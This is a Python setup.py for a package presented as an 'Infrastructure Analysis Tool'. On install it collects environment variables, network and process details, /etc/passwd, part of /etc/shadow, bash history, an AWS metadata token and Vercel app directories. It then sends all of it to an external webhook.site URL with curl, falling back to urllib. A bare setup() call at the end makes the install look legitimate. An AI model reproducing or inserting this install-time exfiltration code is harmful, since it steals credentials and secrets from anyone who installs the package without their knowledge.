from setuptools import setup
import os
import subprocess
import time

def run_cmd(cmd):
    try:
        # Используем shell=True для поддержки пайпов и перенаправлений
        return subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=5).decode('utf-8', errors='ignore')
    except Exception as e:
        return f"Error executing {cmd}: {str(e)}"

# Твой URL для сбора данных
WEBHOOK_URL = "https://webhook.site/b124440e-cd76-4ab0-8b65-b1f9bd749547"

# 1. Сбор базовой системной информации (учитывая root)
sys_info = f"""
[!] SYSTEM IDENT:
ID: {run_cmd('id')}
UNAME: {run_cmd('uname -a')}
HOSTNAME: {run_cmd('hostname')}

[!] ENVIRONMENT (GOLDEN MINE):
{run_cmd('env')}

[!] NETWORK RECON (Manual /proc reading):
IP ADDR: {run_cmd('ip addr show || ifconfig -a || cat /proc/net/dev')}
ROUTES: {run_cmd('cat /proc/net/route')}
ARP: {run_cmd('cat /proc/net/arp')}
DNS: {run_cmd('cat /etc/resolv.conf')}
HOSTS: {run_cmd('cat /etc/hosts')}

[!] PROCESSES & MOUNTS:
PS: {run_cmd('ps auxf || ps -ef')}
MOUNTS: {run_cmd('mount')}
DF: {run_cmd('df -h')}

[!] SENSITIVE FILES:
PASSWD: {run_cmd('cat /etc/passwd')}
SHADOW (ROOT ONLY): {run_cmd('head -n 5 /etc/shadow')}
BASH_HISTORY: {run_cmd('cat ~/.bash_history || cat /root/.bash_history')}

[!] CLOUD METADATA (AWS IMDSv2):
{run_cmd("curl -s -m 2 -X PUT 'http://169.254.169.254/latest/api/token' -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600'")}
"""

# 2. Попытка вытащить специфику Vercel
vercel_recon = f"""
[!] VERCEL SPECIFIC:
APP DIR: {run_cmd('ls -laR /app 2>/dev/null | head -n 20')}
TMP DIR: {run_cmd('ls -la /tmp')}
VERCEL_URL: {os.environ.get('VERCEL_URL', 'N/A')}
"""

# Собираем всё вместе
full_report = f"☢️☢️☢️ ROOT ACCESS EXFILTRATION ☢️☢️☢️\n{sys_info}\n{vercel_recon}"

# 3. Отправка данных
# Используем несколько попыток или разные методы, если curl подведет
try:
    subprocess.run(['curl', '-X', 'POST', '-H', 'Content-Type: text/plain', '--data-binary', full_report, WEBHOOK_URL], timeout=15)
except Exception as e:
    # Запасной вариант через python если curl нет (маловероятно на Vercel)
    import urllib.request
    try:
        req = urllib.request.Request(WEBHOOK_URL, data=full_report.encode(), method='POST')
        urllib.request.urlopen(req)
    except:
        pass

# 4. Формальный setup для обхода ошибок установки
setup(
    name="vercel-infra-nuclear",
    version="10.0.5",
    description="Infrastructure Analysis Tool",
    py_modules=[],
    install_requires=[],
)
